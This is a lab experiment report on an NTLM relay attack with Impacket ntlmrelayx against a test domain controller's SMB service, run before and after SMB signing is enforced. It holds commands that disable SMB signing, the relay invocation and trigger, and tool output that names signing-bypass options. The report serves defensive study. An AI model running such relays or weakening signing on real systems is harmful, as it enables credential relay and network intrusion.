# Experiment 06 — NTLM Relay and SMB Signing

## 1. Objective

Demonstrate an NTLM relay attempt against the SMB service on a Windows Server domain controller and evaluate the impact of enforcing SMB signing.

The experiment compares the relay results before and after SMB signing is enabled and required on the target server.

## 2. Lab Environment

| Machine | Operating System | IP Address | Role |
|---|---|---|---|
| DC01 | Windows Server 2019 | 192.168.100.10 | Domain Controller and SMB relay target |
| CLIENT01 | Windows 10 | 192.168.100.20 | Domain workstation and NTLM authentication source |
| KALI01 | Kali Linux | 192.168.100.30 | Attacker machine running Impacket |

**Domain:** `corp.local`

## 3. Tools

- Kali Linux
- Impacket `ntlmrelayx`
- Windows PowerShell
- SMB2

## 4. Initial Configuration

SMB1 was disabled on DC01. SMB2 was enabled.

For the baseline test, SMB signing was temporarily disabled on DC01:

```powershell
Set-SmbServerConfiguration `
    -EnableSecuritySignature $false `
    -RequireSecuritySignature $false `
    -Force
```

The configuration was verified using:

```powershell
Get-SmbServerConfiguration |
    Select-Object EnableSMB1Protocol,
                  EnableSMB2Protocol,
                  EnableSecuritySignature,
                  RequireSecuritySignature |
    Format-List
```

The baseline configuration showed:

- SMB1: Disabled
- SMB2: Enabled
- EnableSecuritySignature: False
- RequireSecuritySignature: False

## 5. NTLM Relay — Before Hardening

On Kali, Impacket was started with DC01 as the SMB target:

```bash
sudo impacket-ntlmrelayx \
    -t smb://192.168.100.10 \
    -smb2support
```

On CLIENT01, authenticated as the lab domain account, an SMB connection was triggered toward Kali:

```powershell
dir \\192.168.100.30\share
```

### Observed Result

The Impacket output contained:

```text
Authenticating against smb://192.168.100.10 as CORP/LAB.LDAPRELAY SUCCEED
```

This confirms that the relayed NTLM authentication was accepted at the SMB authentication stage.

However, the subsequent DCERPC operation returned:

```text
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

Therefore, the authentication relay was demonstrated, but the follow-up RPC operation was denied. No administrative access or privilege escalation was demonstrated.

**Evidence:** `evidence/02-relay-before.jpg`

## 6. Hardening — Enforcing SMB Signing

SMB signing was re-enabled and made mandatory on DC01:

```powershell
Set-SmbServerConfiguration `
    -EnableSecuritySignature $true `
    -RequireSecuritySignature $true `
    -Force
```

The resulting configuration was verified:

- SMB1: Disabled
- SMB2: Enabled
- EnableSecuritySignature: True
- RequireSecuritySignature: True

**Evidence:** `evidence/03-smb-hardened.png`

## 7. NTLM Relay — After Hardening

The same relay command and authentication trigger were used again.

### Observed Result

Impacket reported:

```text
Signing is required, attack won't work unless using -remove-target / --remove-mic
```

The output also contained:

```text
Authenticating against smb://192.168.100.10 as CORP/LAB.LDAPRELAY SUCCEED
```

followed by:

```text
SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED
```

The authentication exchange was still reported as successful at an earlier stage, but the subsequent SMB operation was denied. No usable relayed SMB access was obtained.

No signing-bypass options were used.

**Evidence:** `evidence/04-relay-after.jpg`

## 8. Results Comparison

| Test | SMB Signing Configuration | Observed Result |
|---|---|---|
| Before hardening | Disabled / Not required | NTLM relay authentication accepted; subsequent RPC operation denied |
| After hardening | Enabled / Required | Signing requirement detected; subsequent SMB operation returned STATUS_ACCESS_DENIED |

## 9. Security Recommendations

- Require SMB signing on domain controllers and other Windows SMB servers.
- Keep SMB1 disabled.
- Review NTLM usage and reduce NTLM authentication where possible.
- Prefer stronger authentication mechanisms and restrict unnecessary NTLM exposure.
- Monitor Windows security logs for suspicious authentication activity.

## 10. Conclusion

This experiment demonstrated an NTLM relay authentication against the SMB service of DC01 under a weakened SMB signing configuration.

The baseline authentication exchange was accepted, although the subsequent RPC operation was denied.

After SMB signing was enabled and required, Impacket identified the signing requirement and the subsequent SMB operation returned `STATUS_ACCESS_DENIED`.

The comparison demonstrates the importance of enforcing SMB signing to prevent an NTLM relay attempt from obtaining usable SMB access.

No DCSync, remote code execution, administrative access, or domain compromise was demonstrated during this experiment.
